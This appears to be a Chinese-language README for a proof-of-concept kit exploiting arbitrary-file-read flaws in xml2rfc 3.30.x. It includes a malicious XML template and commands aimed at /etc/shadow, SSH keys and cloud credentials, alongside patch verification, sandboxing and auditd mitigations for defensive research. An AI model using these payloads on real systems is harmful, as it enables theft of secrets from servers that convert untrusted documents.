# xml2rfc 任意文件读取漏洞 POC 使用说明

## 概述

本目录包含针对 xml2rfc 项目中两个任意文件读取漏洞的概念验证（POC）代码：
- **CVE-2025-11058** (GHSA-cfmv-h8fx-85m7)
- **CVE-2025-11059** (GHSA-9mv7-3c64-mmqw)

## 文件列表

### 分析文档
- `poc_analysis.md` - 详细的漏洞分析报告

### POC XML文件
- `poc_read_passwd.xml` - 读取 /etc/passwd 的基础POC
- `poc_multiple_files.xml` - 读取多个系统文件的POC
- `poc_path_traversal.xml` - 测试路径遍历的POC

### 自动化脚本
- `poc_exploit.py` - Python自动化利用脚本

## 环境准备

### 安装易受攻击的版本（用于测试）

```bash
# 创建虚拟环境
python3 -m venv venv_vulnerable
source venv_vulnerable/bin/activate

# 安装易受攻击的版本
pip install xml2rfc==3.30.0

# 验证版本
xml2rfc --version
```

### 安装安全版本（用于对比）

```bash
# 创建另一个虚拟环境
python3 -m venv venv_fixed
source venv_fixed/bin/activate

# 安装修复后的版本
pip install xml2rfc>=3.30.2

# 验证版本
xml2rfc --version
```

## 使用方法

### 方法1: 使用XML文件直接测试

```bash
# 激活易受攻击版本的环境
source venv_vulnerable/bin/activate

# 使用POC生成PDF
xml2rfc --pdf poc_read_passwd.xml -o output_passwd.pdf

# 查看生成的PDF
ls -lh output_passwd.pdf

# 检查PDF是否包含附件
pdfdetach -list output_passwd.pdf

# 提取附件
mkdir -p extracted
pdfdetach -saveall output_passwd.pdf -o extracted/

# 查看提取的文件
ls -la extracted/
cat extracted/passwd  # 如果成功，会显示 /etc/passwd 的内容
```

### 方法2: 使用自动化Python脚本

#### 基础用法

```bash
# 检查xml2rfc版本
python poc_exploit.py --check-version

# 读取单个文件
python poc_exploit.py --file /etc/passwd --output passwd.pdf

# 读取多个文件
python poc_exploit.py --files /etc/passwd,/etc/hosts,/etc/group --output multiple.pdf

# 详细输出模式
python poc_exploit.py --file /etc/passwd --verbose
```

#### 自动测试模式

```bash
# 运行自动测试套件
python poc_exploit.py --auto-test
```

这将自动测试以下场景：
1. 读取 /etc/passwd
2. 读取多个系统文件
3. 读取系统信息文件
4. 路径遍历攻击

### 方法3: 手动构造恶意XML

```bash
# 创建自定义POC
cat > custom_poc.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-custom-00" category="info">
  <link rel="attachment" href="/path/to/sensitive/file"/>
  <front>
    <title>Custom POC</title>
    <author fullname="Test" initials="T." surname="Test">
      <organization>Test</organization>
    </author>
    <date year="2025"/>
    <abstract><t>Test</t></abstract>
  </front>
  <middle>
    <section><name>Test</name><t>Test content</t></section>
  </middle>
  <back/>
</rfc>
EOF

# 转换为PDF
xml2rfc --pdf custom_poc.xml -o custom.pdf
```

## 验证漏洞是否被成功利用

### 1. 检查PDF文件大小

```bash
ls -lh output_passwd.pdf
```

如果文件大小明显大于预期，说明可能包含了额外的数据（读取的文件）。

### 2. 使用 pdfdetach 工具

```bash
# 安装 poppler-utils (如果未安装)
sudo apt-get install poppler-utils  # Debian/Ubuntu
# 或
brew install poppler  # macOS

# 列出PDF中的附件
pdfdetach -list output_passwd.pdf

# 提取所有附件
pdfdetach -saveall output_passwd.pdf -o extracted/
```

### 3. 使用 pdfinfo 查看PDF信息

```bash
pdfinfo output_passwd.pdf
```

### 4. 使用Python脚本检查

```python
import PyPDF2

def check_pdf_attachments(pdf_path):
    with open(pdf_path, 'rb') as f:
        pdf = PyPDF2.PdfReader(f)
        if '/Names' in pdf.trailer['/Root']:
            names = pdf.trailer['/Root']['/Names']
            if '/EmbeddedFiles' in names:
                print("[+] PDF包含嵌入文件!")
                return True
    print("[-] 未发现嵌入文件")
    return False

check_pdf_attachments('output_passwd.pdf')
```

## 测试不同版本

### 测试易受攻击版本 (3.30.0)

```bash
source venv_vulnerable/bin/activate
python poc_exploit.py --auto-test
deactivate
```

预期结果：成功生成包含敏感文件内容的PDF

### 测试修复版本 (3.30.2+)

```bash
source venv_fixed/bin/activate
python poc_exploit.py --auto-test
deactivate
```

预期结果：
- link标签会被移除
- 会显示警告信息：`Removed <link>. link relationships type attachment is not allowed.`
- 生成的PDF不包含任何附件

## 高级测试场景

### 场景1: 测试路径遍历

```bash
python poc_exploit.py --file "../../../../../../etc/passwd" --output traversal.pdf
```

### 场景2: 使用file:// URI

```bash
python poc_exploit.py --file "file:///etc/shadow" --output shadow.pdf
```

### 场景3: 读取应用配置

```bash
# 尝试读取常见的应用配置文件
python poc_exploit.py --files \
  "/var/www/.env,/home/user/.aws/credentials,/root/.ssh/id_rsa" \
  --output app_configs.pdf
```

### 场景4: 测试CVE-2025-11059（prepped XML）

```bash
# 首先准备XML
xml2rfc --prep poc_read_passwd.xml -o prepped.xml

# 手动在prepped.xml中注入恶意link标签
# 编辑 prepped.xml，在 <rfc> 标签内添加:
# <link rel="attachment" href="/etc/passwd"/>

# 使用修复后的版本测试（应该被阻止）
source venv_fixed/bin/activate
xml2rfc --pdf prepped.xml -o test_fixed.pdf

# 使用3.30.1测试（CVE-2025-11059仍然存在）
# 需要安装3.30.1版本
pip install xml2rfc==3.30.1
xml2rfc --pdf prepped.xml -o test_3_30_1.pdf
```

## 防护验证

### 验证修复是否有效

```bash
# 安装修复版本
pip install xml2rfc>=3.30.2

# 运行POC
xml2rfc --pdf poc_read_passwd.xml -o fixed_version.pdf 2>&1 | tee output.log

# 检查日志中的警告信息
grep "Removed.*link relationships type attachment is not allowed" output.log

# 验证PDF不包含附件
pdfdetach -list fixed_version.pdf
```

预期输出应包含：
```
Removed <link rel="attachment" href="/etc/passwd">. link relationships type attachment is not allowed.
```

## 安全注意事项

⚠️ **警告**: 这些POC仅用于安全研究和授权的渗透测试。

### 使用前须知

1. **仅在授权环境中测试** - 不要在生产系统或未经授权的系统上使用
2. **隔离环境** - 建议在Docker容器或虚拟机中测试
3. **文件权限** - 某些文件（如/etc/shadow）需要root权限才能读取
4. **日志记录** - 文件读取操作可能被系统审计工具记录
5. **法律合规** - 确保你的测试活动符合当地法律法规

### 推荐的测试环境

```bash
# 使用Docker创建隔离测试环境
docker run -it --rm -v $(pwd):/workspace ubuntu:22.04 bash

# 在容器内安装依赖
apt-get update
apt-get install -y python3 python3-pip poppler-utils
pip3 install xml2rfc==3.30.0

# 运行测试
cd /workspace
python3 poc_exploit.py --auto-test
```

## 清理

```bash
# 删除生成的文件
rm -f *.pdf *.xml.prep
rm -rf extracted/

# 删除虚拟环境
rm -rf venv_vulnerable/ venv_fixed/
```

## 缓解措施

如果你运行的是易受攻击的版本且无法立即升级：

### 1. 输入验证

```python
import lxml.etree

def sanitize_xml_input(xml_content):
    """移除所有 rel="attachment" 的link标签"""
    try:
        tree = lxml.etree.fromstring(xml_content.encode())
        for attachment in tree.xpath('//link[@rel="attachment"]'):
            attachment.getparent().remove(attachment)
        return lxml.etree.tostring(tree, encoding='unicode')
    except Exception as e:
        raise ValueError(f"XML验证失败: {e}")

# 使用示例
with open('untrusted_input.xml', 'r') as f:
    xml_content = f.read()

safe_xml = sanitize_xml_input(xml_content)

with open('sanitized_input.xml', 'w') as f:
    f.write(safe_xml)
```

### 2. 文件系统隔离

使用Linux命名空间或容器技术限制文件访问：

```bash
# 使用 bubblewrap 创建沙箱
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /lib /lib \
  --ro-bind /lib64 /lib64 \
  --tmpfs /tmp \
  --proc /proc \
  --dev /dev \
  --unshare-all \
  --new-session \
  xml2rfc --pdf input.xml -o output.pdf
```

### 3. 监控和告警

```bash
# 使用 auditd 监控文件访问
auditctl -w /etc/passwd -p r -k xml2rfc_access
auditctl -w /etc/shadow -p r -k xml2rfc_access
auditctl -w /root/.ssh/ -p r -k xml2rfc_access

# 查看日志
ausearch -k xml2rfc_access
```

## 故障排除

### 问题: "Cannot run PDF formatter: No module named 'weasyprint'"

```bash
pip install weasyprint
```

### 问题: pdfdetach命令未找到

```bash
# Ubuntu/Debian
sudo apt-get install poppler-utils

# macOS
brew install poppler

# CentOS/RHEL
sudo yum install poppler-utils
```

### 问题: 生成的PDF不包含附件

可能的原因：
1. 使用的是修复后的版本（预期行为）
2. 目标文件不存在或没有读取权限
3. WeasyPrint版本不支持附件功能

验证：
```bash
# 检查文件是否存在且可读
ls -l /etc/passwd
cat /etc/passwd

# 检查xml2rfc版本
xml2rfc --version

# 使用--verbose查看详细输出
python poc_exploit.py --file /etc/passwd --verbose
```

## 参考资源

- [GHSA-cfmv-h8fx-85m7](https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-cfmv-h8fx-85m7)
- [GHSA-9mv7-3c64-mmqw](https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-9mv7-3c64-mmqw)
- [修复提交 f2b245bc](https://github.com/ietf-tools/xml2rfc/commit/f2b245bc0aeeac0667c8f74e976c466c5991f0e4)
- [修复提交 73fb1c91](https://github.com/ietf-tools/xml2rfc/commit/73fb1c91fc62ac540bb6bd24f982f2becf84c1b0)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)

## 报告漏洞

如果你发现了新的安全问题，请通过负责任的披露流程报告：
- 不要公开披露未修复的漏洞
- 联系项目维护者: https://github.com/ietf-tools/xml2rfc/security
- 提供详细的复现步骤和影响评估

## 许可

本POC代码仅用于教育和研究目的。使用者需自行承担所有责任。
